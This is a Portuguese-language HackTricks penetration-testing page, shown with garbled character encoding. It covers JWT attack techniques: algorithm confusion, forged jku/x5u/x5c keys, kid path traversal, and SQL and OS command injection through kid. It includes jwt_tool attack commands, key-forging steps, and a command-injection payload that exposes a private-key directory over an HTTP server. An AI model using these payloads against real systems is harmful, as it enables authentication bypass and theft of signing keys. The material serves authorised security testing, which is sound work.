# Vulnerabilidades do JWT (Json Web Tokens)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se voc√™ est√° interessado em uma **carreira de hacking** e hackear o inquebr√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

**Parte deste post √© baseada no incr√≠vel post:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor da √≥tima ferramenta para pentest em JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Ganhos R√°pidos**

Execute [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) com o modo `All Tests!` e aguarde as linhas verdes
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Se tiver sorte, a ferramenta encontrar√° algum caso em que a aplica√ß√£o web n√£o est√° verificando corretamente o JWT:

![](<../.gitbook/assets/image (932).png>)

Em seguida, voc√™ pode pesquisar a solicita√ß√£o em seu proxy ou extrair o JWT usado para essa solicita√ß√£o usando a ferramenta jwt\_:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Manipular dados sem modificar nada

Voc√™ pode simplesmente manipular os dados deixando a assinatura como est√° e verificar se o servidor est√° verificando a assinatura. Tente alterar seu nome de usu√°rio para "admin", por exemplo.

#### **O token est√° sendo verificado?**

Para verificar se a assinatura de um JWT est√° sendo verificada:

* Uma mensagem de erro sugere verifica√ß√£o em andamento; detalhes sens√≠veis em erros verbosos devem ser revisados.
* Uma mudan√ßa na p√°gina retornada tamb√©m indica verifica√ß√£o.
* Nenhuma mudan√ßa sugere nenhuma verifica√ß√£o; √© nesse momento que se deve experimentar manipular as reivindica√ß√µes de carga √∫til.

### Origem

√â importante determinar se o token foi gerado no lado do servidor ou no lado do cliente examinando o hist√≥rico de solicita√ß√µes do proxy.

* Tokens vistos pela primeira vez do lado do cliente sugerem que a chave pode estar exposta ao c√≥digo do lado do cliente, exigindo investiga√ß√£o adicional.
* Tokens originados no lado do servidor indicam um processo seguro.

### Dura√ß√£o

Verifique se o token dura mais de 24 horas... talvez ele nunca expire. Se houver um campo "exp", verifique se o servidor est√° lidando corretamente com ele.

### For√ßa bruta no segredo HMAC

[**Veja esta p√°gina.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modificar o algoritmo para None

Defina o algoritmo usado como "None" e remova a parte da assinatura.

Use a extens√£o Burp chamada "JSON Web Token" para tentar essa vulnerabilidade e alterar diferentes valores dentro do JWT (envie a solicita√ß√£o para o Repeater e na guia "JSON Web Token" voc√™ pode modificar os valores do token. Voc√™ tamb√©m pode selecionar para colocar o valor do campo "Alg" como "None").

### Alterar o algoritmo de RS256 (assim√©trico) para HS256 (sim√©trico) (CVE-2016-5431/CVE-2016-10555)

O algoritmo HS256 usa a chave secreta para assinar e verificar cada mensagem.\
O algoritmo RS256 usa a chave privada para assinar a mensagem e usa a chave p√∫blica para autentica√ß√£o.

Se voc√™ alterar o algoritmo de RS256 para HS256, o c√≥digo do back-end usar√° a chave p√∫blica como a chave secreta e ent√£o usar√° o algoritmo HS256 para verificar a assinatura.

Ent√£o, usando a chave p√∫blica e alterando de RS256 para HS256, poder√≠amos criar uma assinatura v√°lida. Voc√™ pode recuperar o certificado do servidor web executando o seguinte:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nova chave p√∫blica dentro do cabe√ßalho

Um atacante incorpora uma nova chave no cabe√ßalho do token e o servidor utiliza essa nova chave para verificar a assinatura (CVE-2018-0114).

Isso pode ser feito com a extens√£o "JSON Web Tokens" do Burp.\
(Envie a solicita√ß√£o para o Repeater, dentro da guia JSON Web Token selecione "CVE-2018-0114" e envie a solicita√ß√£o).

### Falsifica√ß√£o de JWKS

As instru√ß√µes detalham um m√©todo para avaliar a seguran√ßa de tokens JWT, especialmente aqueles que empregam uma declara√ß√£o de cabe√ßalho "jku". Essa declara√ß√£o deve se vincular a um arquivo JWKS (JSON Web Key Set) que contenha a chave p√∫blica necess√°ria para a verifica√ß√£o do token.

* **Avaliando Tokens com Cabe√ßalho "jku"**:
* Verifique a URL da declara√ß√£o "jku" para garantir que ela leve ao arquivo JWKS apropriado.
* Modifique o valor "jku" do token para direcionar para um servi√ßo web controlado, permitindo a observa√ß√£o do tr√°fego.
* **Monitorando a Intera√ß√£o HTTP**:
* Observar as solicita√ß√µes HTTP para a URL especificada indica as tentativas do servidor de buscar chaves a partir do link fornecido.
* Ao utilizar `jwt_tool` para esse processo, √© crucial atualizar o arquivo `jwtconf.ini` com a localiza√ß√£o do seu JWKS pessoal para facilitar os testes.
* **Comando para `jwt_tool`**:
*   Execute o seguinte comando para simular o cen√°rio com `jwt_tool`:

```bash
python3 jwt_tool.py JWT_AQUI -X s
```

### Vis√£o Geral de Problemas com Kid

Uma declara√ß√£o de cabe√ßalho opcional conhecida como `kid` √© utilizada para identificar uma chave espec√≠fica, o que se torna particularmente vital em ambientes nos quais m√∫ltiplas chaves existem para verifica√ß√£o da assinatura do token. Essa declara√ß√£o auxilia na sele√ß√£o da chave apropriada para verificar a assinatura de um token.

#### Revelando Chave atrav√©s de "kid"

Quando a declara√ß√£o `kid` est√° presente no cabe√ßalho, √© aconselh√°vel pesquisar o diret√≥rio da web pelo arquivo correspondente ou suas varia√ß√µes. Por exemplo, se `"kid":"chave/12345"` for especificado, os arquivos _/chave/12345_ e _/chave/12345.pem_ devem ser procurados na raiz da web.

#### Traversing de Caminho com "kid"

A declara√ß√£o `kid` tamb√©m pode ser explorada para navegar pelo sistema de arquivos, potencialmente permitindo a sele√ß√£o de um arquivo arbitr√°rio. √â vi√°vel testar a conectividade ou executar ataques de Solicita√ß√£o de Servidor-Side Request Forgery (SSRF) alterando o valor `kid` para direcionar arquivos ou servi√ßos espec√≠ficos. Manipular o JWT para alterar o valor `kid` mantendo a assinatura original pode ser alcan√ßado usando a flag `-T` no jwt\_tool, conforme demonstrado abaixo:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Ao direcionar arquivos com conte√∫do previs√≠vel, √© poss√≠vel forjar um JWT v√°lido. Por exemplo, o arquivo `/proc/sys/kernel/randomize_va_space` em sistemas Linux, conhecido por conter o valor **2**, pode ser usado no par√¢metro `kid` com **2** como a senha sim√©trica para a gera√ß√£o do JWT.

#### Inje√ß√£o de SQL via "kid"

Se o conte√∫do da reivindica√ß√£o `kid` for utilizado para buscar uma senha de um banco de dados, uma inje√ß√£o de SQL poderia ser facilitada ao modificar a carga √∫til do `kid`. Um exemplo de carga √∫til que usa inje√ß√£o de SQL para alterar o processo de assinatura do JWT inclui:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Essa altera√ß√£o for√ßa o uso de uma chave secreta conhecida, `ATTACKER`, para a assinatura do JWT.

#### Inje√ß√£o de SO atrav√©s do "kid"

Um cen√°rio em que o par√¢metro `kid` especifica um caminho de arquivo usado em um contexto de execu√ß√£o de comando poderia levar a vulnerabilidades de Execu√ß√£o Remota de C√≥digo (RCE). Ao injetar comandos no par√¢metro `kid`, √© poss√≠vel expor chaves privadas. Um exemplo de carga √∫til para alcan√ßar RCE e exposi√ß√£o de chaves √©:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u e jku

#### jku

jku significa **URL do Conjunto de JWK**.\
Se o token usar uma reivindica√ß√£o de **Cabe√ßalho** "**jku**", **verifique a URL fornecida**. Isso deve apontar para uma URL contendo o arquivo JWKS que cont√©m a Chave P√∫blica para verificar o token. Manipule o token para apontar o valor jku para um servi√ßo da web no qual voc√™ possa monitorar o tr√°fego.

Primeiro, voc√™ precisa criar um novo certificado com novas chaves privadas e p√∫blicas.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Ent√£o voc√™ pode usar, por exemplo, [**jwt.io**](https://jwt.io) para criar o novo JWT com as **chaves p√∫blica e privada criadas e apontando o par√¢metro jku para o certificado criado.** Para criar um certificado jku v√°lido, voc√™ pode baixar o original e alterar os par√¢metros necess√°rios.

Voc√™ pode obter os par√¢metros "e" e "n" de um certificado p√∫blico usando:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

URL X.509. Um URI apontando para um conjunto de certificados p√∫blicos X.509 (um padr√£o de formato de certificado) codificados em formato PEM. O primeiro certificado no conjunto deve ser o usado para assinar este JWT. Os certificados subsequentes assinam cada um o anterior, completando assim a cadeia de certificados. X.509 √© definido no RFC 5280. A seguran√ßa de transporte √© necess√°ria para transferir os certificados.

Tente **alterar este cabe√ßalho para um URL sob seu controle** e verifique se alguma solicita√ß√£o √© recebida. Nesse caso, voc√™ **poderia adulterar o JWT**.

Para forjar um novo token usando um certificado controlado por voc√™, √© necess√°rio criar o certificado e extrair as chaves p√∫blica e privada:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Ent√£o voc√™ pode usar, por exemplo, [**jwt.io**](https://jwt.io) para criar o novo JWT com as **chaves p√∫blicas e privadas criadas e apontando o par√¢metro x5u para o certificado .crt criado**.

![](<../.gitbook/assets/image (953).png>)

Voc√™ tamb√©m pode abusar de ambas essas vulnerabilidades **para SSRFs**.

#### x5c

Este par√¢metro pode conter o **certificado em base64**:

![](<../.gitbook/assets/image (1116).png>)

Se o atacante **gerar um certificado autoassinado** e criar um token falsificado usando a chave privada correspondente e substituir o valor do par√¢metro "x5c" pelo certificado rec√©m-gerado e modificar os outros par√¢metros, nomeadamente n, e e x5t, ent√£o essencialmente o token falsificado seria aceito pelo servidor.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Chave P√∫blica Incorporada (CVE-2018-0114)

Se o JWT tiver incorporada uma chave p√∫blica como no seguinte cen√°rio:

![](<../.gitbook/assets/image (619).png>)

Usando o seguinte script nodejs √© poss√≠vel gerar uma chave p√∫blica a partir desses dados:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
√â poss√≠vel gerar um novo par de chaves privada/p√∫blica, incorporar a nova chave p√∫blica dentro do token e us√°-la para gerar uma nova assinatura:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Voc√™ pode obter o "n" e o "e" usando este script nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### ES256: Revelando a chave privada com o mesmo nonce

Se algumas aplica√ß√µes usam ES256 e utilizam o mesmo nonce para gerar dois JWTs, a chave privada pode ser restaurada.

Aqui est√° um exemplo: [ECDSA: Revelando a chave privada, se o mesmo nonce for usado (com SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

O claim JTI (JWT ID) fornece um identificador √∫nico para um Token JWT. Pode ser usado para evitar que o token seja reutilizado.\
No entanto, imagine uma situa√ß√£o em que o comprimento m√°ximo do ID √© 4 (0001-9999). As requisi√ß√µes 0001 e 10001 v√£o usar o mesmo ID. Portanto, se o backend estiver incrementando o ID a cada requisi√ß√£o, voc√™ poderia abusar disso para **repetir uma requisi√ß√£o** (sendo necess√°rio enviar 10000 requisi√ß√µes entre cada repeti√ß√£o bem-sucedida).

### Claims Registrados do JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Outros ataques

**Ataques de Revezamento entre Servi√ßos**

Foi observado que algumas aplica√ß√µes web dependem de um servi√ßo JWT confi√°vel para a gera√ß√£o e gerenciamento de seus tokens. Foram registradas inst√¢ncias em que um token, gerado para um cliente pelo servi√ßo JWT, foi aceito por outro cliente do mesmo servi√ßo JWT. Se a emiss√£o ou renova√ß√£o de um JWT via um servi√ßo de terceiros for observada, a possibilidade de se inscrever em uma conta em outro cliente desse servi√ßo usando o mesmo nome de usu√°rio/email deve ser investigada. Deve-se ent√£o tentar repetir o token obtido em uma requisi√ß√£o ao alvo para ver se √© aceito.

* A aceita√ß√£o do seu token pode indicar um problema cr√≠tico, potencialmente permitindo a falsifica√ß√£o da conta de qualquer usu√°rio. No entanto, deve-se observar que pode ser necess√°ria permiss√£o para testes mais amplos ao se inscrever em um aplicativo de terceiros, pois isso poderia entrar em uma √°rea legal cinzenta.

**Verifica√ß√£o de Expira√ß√£o de Tokens**

A expira√ß√£o do token √© verificada usando o claim "exp" do Payload. Dado que os JWTs frequentemente s√£o utilizados sem informa√ß√µes de sess√£o, √© necess√°ria uma manipula√ß√£o cuidadosa. Em muitas inst√¢ncias, capturar e repetir o JWT de outro usu√°rio poderia permitir a impersonifica√ß√£o desse usu√°rio. O RFC do JWT recomenda mitigar ataques de repeti√ß√£o de JWT utilizando o claim "exp" para definir um tempo de expira√ß√£o para o token. Al√©m disso, a implementa√ß√£o de verifica√ß√µes relevantes pela aplica√ß√£o para garantir o processamento desse valor e a rejei√ß√£o de tokens expirados √© crucial. Se o token incluir um claim "exp" e os limites de tempo de teste permitirem, armazenar o token e repeti-lo ap√≥s o tempo de expira√ß√£o ter passado √© aconselh√°vel. O conte√∫do do token, incluindo a an√°lise de timestamp e verifica√ß√£o de expira√ß√£o (timestamp em UTC), pode ser lido usando a flag -R da ferramenta jwt_tool.

* Um risco de seguran√ßa pode estar presente se a aplica√ß√£o ainda validar o token, pois isso pode implicar que o token nunca poderia expirar.

### Ferramentas

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se voc√™ est√° interessado em uma **carreira de hacking** e hackear o inquebr√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou nos siga no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
